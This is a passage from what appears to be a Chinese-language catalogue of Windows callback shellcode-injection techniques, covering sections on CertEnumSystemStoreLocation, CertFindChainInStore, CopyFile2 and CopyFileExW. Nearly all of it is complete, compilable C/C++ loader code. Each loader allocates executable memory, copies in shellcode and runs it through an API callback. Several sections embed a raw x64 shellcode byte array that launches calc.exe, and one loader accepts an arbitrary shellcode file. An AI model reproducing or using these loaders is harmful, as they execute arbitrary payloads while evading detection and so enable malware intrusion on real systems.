class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;::CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(PFN_CERT_ENUM_SYSTEM_STORE)addr);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>}<br></code></pre>
<h1 id="h20certenumsystemstorelocation"><span>20.回调函数注入 通过 CertEnumSystemStoreLocation</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;wincrypt.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;requires&nbsp;Crypt32.lib</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">10</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;::CertEnumSystemStoreLocation(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">nullptr</span>,&nbsp;(PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)addr);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>}<br></code></pre>
<h1 id="h21certfindchaininstore"><span>21.回调函数注入 通过 CertFindChainInStore</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Crypt32.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;wincrypt.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;HCERTSTORE&nbsp;hCertStore&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;CERT_CHAIN_FIND_ISSUER_PARA&nbsp;sCCFIP&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;CertFindChainInStore.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;hCertStore&nbsp;=&nbsp;CertOpenStore(CERT_STORE_PROV_SYSTEM,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;CERT_SYSTEM_STORE_CURRENT_USER,&nbsp;<span class="hljs-string">L"My"</span>);<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;sCCFIP.pfnFindCallback&nbsp;=&nbsp;(PFN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK)hAlloc;<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;sCCFIP.cbSize&nbsp;=&nbsp;<span class="hljs-keyword">sizeof</span>(CERT_CHAIN_FIND_ISSUER_PARA);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;CertFindChainInStore(hCertStore,&nbsp;X509_ASN_ENCODING,&nbsp;<span class="hljs-number">0</span>,&nbsp;CERT_CHAIN_FIND_BY_ISSUER,&nbsp;&amp;sCCFIP,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>CLEANUP:<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hCertStore)<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CertCloseStore(hCertStore,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">49</span><br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">51</span>}<br><span class="linenum hljs-number">52</span><br><span class="linenum hljs-number">53</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">54</span></span>{<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">66</span><br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">68</span>}<br></code></pre>
<h1 id="h22copyfile2"><span>22.回调函数注入 通过 CopyFile2</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;dpa_dsa.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">err</span><span class="hljs-params">(<span class="hljs-keyword">const</span>&nbsp;<span class="hljs-keyword">char</span>*&nbsp;errmsg)</span>&nbsp;</span>{<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error:&nbsp;%s&nbsp;(%u)\n"</span>,&nbsp;errmsg,&nbsp;::GetLastError());<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">1</span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span>}<br><span class="linenum hljs-number">13</span><br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number">16</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">29</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">30</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">31</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">32</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">33</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">34</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">35</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;COPYFILE2_EXTENDED_PARAMETERS&nbsp;params;<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;params.dwSize&nbsp;=&nbsp;{&nbsp;<span class="hljs-keyword">sizeof</span>(params)&nbsp;};<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;params.dwCopyFlags&nbsp;=&nbsp;COPY_FILE_FAIL_IF_EXISTS;<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;params.pfCancel&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;params.pProgressRoutine&nbsp;=&nbsp;(PCOPYFILE2_PROGRESS_ROUTINE)addr;<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;params.pvCallbackContext&nbsp;=&nbsp;<span class="hljs-literal">nullptr</span>;<br><span class="linenum hljs-number">52</span><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;::DeleteFileW(<span class="hljs-string">L"C:\\Windows\\Temp\\backup.log"</span>);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;::CopyFile2(<span class="hljs-string">L"C:\\Windows\\DirectX.log"</span>,&nbsp;<span class="hljs-string">L"C:\\Windows\\Temp\\backup.log"</span>,&nbsp;&amp;params);<br><span class="linenum hljs-number">55</span><br><span class="linenum hljs-number">56</span>}<br></code></pre>
<h1 id="h23copyfileex"><span>23.回调函数注入 通过 CopyFileEx</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;::DeleteFileW(<span class="hljs-string">L"C:\\Windows\\Temp\\backup.log"</span>);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;::CopyFileExW(<span class="hljs-string">L"C:\\Windows\\DirectX.log"</span>,&nbsp;<span class="hljs-string">L"C:\\Windows\\Temp\\backup.log"</span>,&nbsp;(LPPROGRESS_ROUTINE)addr,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;FALSE,&nbsp;COPY_FILE_FAIL_IF_EXISTS);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>}<br></code></pre>
<h1 id="h24copyfiletransacted"><span>24.回调函数注入 通过 CopyFileTransacted</span></h1>
